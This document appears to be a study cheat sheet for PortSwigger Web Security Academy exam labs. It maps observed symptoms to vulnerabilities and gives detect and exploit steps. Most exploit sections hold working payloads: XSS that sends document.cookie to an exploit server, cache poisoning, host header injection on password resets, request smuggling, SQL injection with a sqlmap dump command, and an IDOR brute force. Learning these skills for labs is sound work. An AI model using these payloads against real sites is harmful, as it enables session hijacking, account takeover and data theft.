# Stage 1 - anonymous to user session
## Possible Cases
| Case      | Probable exploit |
| ----------- | ----------- |
| tracking.js | Host header poisoning / Cache poisoning |
| <script>alert(1)</script> in the search | XSS |
| Post a comment | HTTP Request Smuggling |
| Different message error when resetting password | Bruteforce | 
| None of the above | Bruteforce |


# Stage 2 - user to administrator session
## Possible Cases
| Case      | Probable exploit |
| ----------- | ----------- |
| Advanced search | SQL injection |
| Session cookie with "isloggedin" | CSRF |
| Request in Burp proxy when updating email with "timestamp" | CORS |
| Different message error when resetting password | Bruteforce | 
| JSON request when updating email with answer contained "id" but not in the request | IDOR |
| Able to remove the parameter csrf when updating the email | CSRF |


# Stage 3 - command execution as administrator
## Possible Cases
| Case      | Probable exploit |
| ----------- | ----------- |
| Upload XML feature | XXE or XML command injection |
| Change the blog image | SSRF/Remote file inclusion |
| Right click on an image and seeing a size parameter | Command injection |
| An example of template for reset email | SSTI | 
| Download a file for report | SSRF |
| Lots of images and no size parameter | Directory traversal |


# XSS DOM Based
## Detect:
```
GET /

<script>
    window.addEventListener('message', function(e) {
        var img = document.createElement('img'), ACMEplayer = {element: img}, d;
        document.body.appendChild(img);
        try {
            d = JSON.parse(e.data);
        } catch(e) {
            return;
        }
        switch(d.type) {
            case "page-load":
                ACMEplayer.element.scrollIntoView();
                break;
            case "load-channel":
                ACMEplayer.element.src = d.url;
                break;
            case "player-height-changed":
                ACMEplayer.element.style.width = d.width + "px";
                ACMEplayer.element.style.height = d.height + "px";
                break;
            case "redirect":
                window.location.replace(d.redirectUrl);
                break;
        }
    }, false);
</script>
```
## Exploit:
```
<iframe src=https://LAB.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"redirect\",\"redirectUrl\":\"javascript:window.location=%22https://EXPLOIT-SERVER-URL-XX.web-securityacademy.net/?c=%22%2bdocument.cookie\"}","*")' >
```
# XSS Blacklisted Tags & Attributes
## Detect:
```
GET /?find="><script>alert(1)</script>
"Tag is not allowed"
```
## Exploit:
```
GET /?find=<§§> HTTP/1.1
On https://portswigger.net/web-security/cross-site-scripting/cheat-sheet, click the button "Copy tags to clipboard", and then go back to Burp Intruder, and on the payload tab, click "Paste" to insert the list of HTML tags.

GET /?find=<body+§§=''> HTTP/1.1
On https://portswigger.net/web-security/cross-site-scripting/cheat-sheet, click the button "Copy events to clipboard", and then go back to Burp Intruder, and on the payload tab, click "Paste" to insert the list of HTML events.

GET https://LAB-URL-XX/?find=<body+onload=alert(1)>

For onpageshow event etc:
echo "document.location='https://XX-EXPLOIT-SERVER-URL-XX/?x='+document.cookie" | base64
<iframe src="https://LAB-URL-XX/?searchterm='%3Cbody+onload=eval(atob('XX-BASE64-HERE-XX'))%3E//" onload="this.onload='';this.src+='#1'"></iframe>

For onmessage event:
<!DOCTYPE html>
    <body onload="Exploit()">
        <h2>Exploit</h2>
        <p>Exploit OnMessage XSS</p>
        <p>Use target & msg as URL parameters.</p>
        <iframe id="f" height="0" style="visibility:hidden">
        </iframe>
        <script>
            searchParams = new URLSearchParams(document.location.search);
            target = searchParams.get('target');
            msg = searchParams.get('msg');
            document.getElementById('f').setAttribute('src', target);
            function Exploit() {frames[0].postMessage(msg,'*')}
        </script>
    </body>
</html>
<iframe src="https://your-exploit-server-id.exploit-server.net/exploit?target=https://your-lab-id.web-security-academy.net/%3Cbody%20onmessage=document.location=%22https://your-exploit-server-id.exploit-server.net/?c=%22%25%32%62(document.cookie)%3E>">
```
# XSS Filter Bypass
## Detect:
```
Search feature parameter such as searchterm, find, etc.
```
## Exploit:
```

```
# Cache Poisoning
## Detect:
```
GET / HTTP/1.1
Should see "X-Cache: Miss" on first time, and "X-Cache: Hit" on subsequent hits.
```
## Exploit:
```
Exploit server, replace the endpoint from "/exploit" to "/resources/js/tracking.js"

Body:
document.location='https://XX-EXPLOIT-SERVER-URL-XX?x='+document.cookie;

GET / HTTP/1.1
X-Forwarded-For: XX-DOMAIN-NAME-EXPLOIT-SERVER-XX
```
# Host Header Poisoning
## Detect:
```
Login, there is a "forgot password" form. Try username "administrator" and receive a message such as "An email has been sent to reset the password". If you enter a non-existing username such as "randomname" the message will be different.

Perform username enumeration like other bruteforce case.
```
## Exploit:
```
Send the password reset feature to the ParamMiner extension > Guess headers. It will identify header injection such as:
X-Host
X-Forwarded-Host
X-Forwarded-For
etc.

POST /forgot_password HTTP/1.1
Host: LAB-URL.web-security-academy.net
X-Forwarded-Host: XX_EXPLOIT_SERVER.web-security-academy.net

If returns the error "Invalid hostname", bypass the filter:
X-Forwarded-Host: XX_EXPLOIT_SERVER.web-security-academy.net/?foo=XX_LAB_SERVER.net
X-Forwarded-Host: LAB-URL.web-security-academy.net:password@XX_EXPLOIT_SERVER.web-security-academy.net

Possible filters to bypass:
# & ? = @
```
# HTTP Request Smuggling
## Detect:
```
XSS in the User-Agent found with active scanner when retrieving a comment page.
```
## Exploit:
```
GET /post?postId=1 HTTP/1.1
Host: LAB-SERVER.web-security-academy.net
User-Agent: "><script>alert(1);</script>

GET /post?postId=1 HTTP/1.1
Host: LAB-URL.web-security-academy.net
User-Agent: "><script>alert(document.cookie);var x=new XMLHttpRequest();x.open("GET","https://XX_EXPLOIT_SERVER.web-security-academy.net/"+document.cookie);x.send();</script>

Send multiple times from repeater:
POST /post/comment?c=0 HTTP/1.1
Host: LAB-SERVER.web-security-academy.net
Cookie: session=XXXXXXXXXXXXXXXXXX; _lab_analytics=XXXXXXXXXXXXXXXXXXXXXXXXXX; _lab=XXXXXXXXXXXXXXXXXXXXXXXXXXXX
Origin: https://LAB-SERVER.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Transfer-Encoding: chunked, identity
Content-Length: 588
Connection: keep-alive

11c
368j9=x&csrf=XXXXXXXXXXXXXXXXXXXXXXX&userAgent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F126.0.6478.127+Safari%2F537.36&postId=1&comment=test&name=test&email=test%40test.test&website=http%3A%2F%2Ftest.test&wdsna=x
0

GET /post?postId=1 HTTP/1.1
Host: LAB-SERVER.web-security-academy.net
User-Agent: "><script>alert(document.cookie);var x=new XMLHttpRequest();x.open("GET","https://XX_EXPLOIT_SERVER.web-security-academy.net/c-"+document.cookie);x.send();</script>
```
# Bruteforce
## Detect:
```
List of usernames: https://portswigger.net/web-security/authentication/auth-lab-usernames
List of passwords: https://portswigger.net/web-security/authentication/auth-lab-passwords
```
## Exploit:
```
Intruder, login usernames / passwords / parameter example user=BRUTEFORCE
```
# CSRF isloggedin
## Detect:
```
Set-Cookie: session=%7b%22username%22%3a%22carlos%22%2c%22isloggedin%22%3afalse%7d--MFAOHJNNviuazsqvS%2bywVpIS9UU%2fAhQaFOfa5z8afhuaRHJoj5Q%3d%3d; _lab=.......
```
## Exploit:
```
Intercept the request to change email.
Server must never receive the CSRF and consume it, so "Drop" the request.

In another browser session (Incognito), reset a password and input "administrator".
Intercept the request and change both the CSRF token + cookie using Carlos's cookie.

Username changes from carlos to administrator.
Copy the cookie into the browser to connect as Administrator.

Set Administrator email to own email, then reset password to login.
```
# SQL injection
## Detect:
```
Advanced search > searchTerm= etc
```
## Exploit:
```
GET /searchadvanced?searchTerm='));SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--&organizeby=DATE&blog_artist=a HTTP/1.1
Host: ...

sqlmap -r request --level 2 --risk 2 --force-ssl --threads 10 --banner --dbs -D public --tables -T users --dump
```
# Access Control / IDOR
## Detect:
```
Logged in, the feature "Change email".
Send request to the Repeater.

POST /myaccount/update-email HTTP/1.1
Host: LAB-SERVER.web-security-academy.net
Cookie: _lab=XXX; session=XYZXYZXYZ
Content-Length: 88
Connection: close

{"csrf":"XXXXXXXXXXXXXXXXXXXX","email":"wiener@normal-user.net"}
```
## Exploit:
```
{"csrf":"XXXXXXXXXXXXXXXXXXXX","email":"wiener@normal-user.net","roleid":3}
"Invalid Role ID for carlos"

Intruder 0 to 1000:
{"csrf":"XXXXXXXXXXXXXXXXXXXX","email":"wiener@normal-user.net","roleid":§§}
```
# XSS Blacklisted Tags & Attributes
## Detect:
```
```
## Exploit:
```
```
# XSS Blacklisted Tags & Attributes
## Detect:
```
```
## Exploit:
```
```
